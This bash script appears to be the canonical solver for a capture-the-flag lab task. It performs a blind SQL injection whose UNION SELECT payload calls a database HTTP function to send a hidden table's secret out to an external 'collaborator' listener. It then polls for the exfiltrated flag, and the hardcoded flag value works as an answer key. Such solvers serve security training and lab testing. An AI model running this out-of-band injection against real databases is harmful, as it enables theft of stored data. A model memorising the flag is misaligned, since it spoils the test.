#!/usr/bin/env bash
# solvers/p3_1.sh — Task 3.1 "The Spell Card" canonical exploit.
#
# This floor's own HTTP response is fully blind: /p3/spellcard always renders
# the same "the card was cast into the field" text regardless of what the
# query returns, errors, or whether it even runs at all.  No in-band signal
# exists to read.
#
# The OOB primitive: the MariaDB image ships with a custom http_get() UDF
# (udf/http_get.c, compiled by mariadb/Dockerfile, registered in the seed
# SQL).  Calling it from an injected UNION SELECT causes *MariaDB's own
# process* to originate a real outbound HTTP GET to whatever URL is passed —
# the application layer is completely uninvolved.  The canonical listener
# on the lab's internal network is the `collaborator` service.
#
# Payload breakdown:
#   card = nonexistent' UNION SELECT http_get(CONCAT('http://collaborator/spellcard-cast/', secret)) FROM sealed_cards-- -
#
#   nonexistent'          close the string literal; the WHERE no longer matches anything
#   UNION SELECT          append a second result set with the same shape (one column)
#   http_get(CONCAT(...)) for each row in sealed_cards, call the UDF with a URL
#                         that embeds the flag in the path → MariaDB fires that GET
#   FROM sealed_cards     the hidden table holding the flag
#   -- -                  comment out the original trailing quote
#
# The application receives the UDF's return value (just an HTTP status code)
# and discards it.  The flag travels out-of-band, arriving at collaborator
# as a real, separate HTTP request the database engine sent.
set -uo pipefail

BASE="${SEIYAKU_BASE:-http://localhost:8000}"
FLAG="SEIYAKU{word_left_the_island}"

PAYLOAD="nonexistent' UNION SELECT http_get(CONCAT('http://collaborator/spellcard-cast/', secret)) FROM sealed_cards-- -"

echo "[p3_1] GET ${BASE}/p3/spellcard — fully-blind OOB injection via http_get() UDF"
echo "[p3_1] payload: card=${PAYLOAD}"

resp=$(curl -s -G "${BASE}/p3/spellcard" --data-urlencode "card=${PAYLOAD}")

# The response must NOT contain the flag.
if echo "$resp" | grep -qF "$FLAG"; then
    echo "[p3_1] WARNING: flag appeared in the in-band HTTP response — blind property broken"
fi

echo "[p3_1] polling ${BASE}/p3/spellcard/captures for the OOB confirmation..."

found=""
for i in $(seq 1 30); do
    captures=$(curl -s "${BASE}/p3/spellcard/captures")
    if echo "$captures" | grep -qF "$FLAG"; then
        found="1"
        break
    fi
    sleep 1
done

if [ -n "$found" ]; then
    echo "[p3_1] ok: flag recovered out-of-band from collaborator's captures: ${FLAG}"
    echo "[p3_1] PASS"
    exit 0
else
    echo "[p3_1] FAIL: flag never appeared in collaborator's captures within the timeout"
    echo "---- last captures poll ----"
    echo "$captures"
    echo "----------------------------"
    exit 1
fi
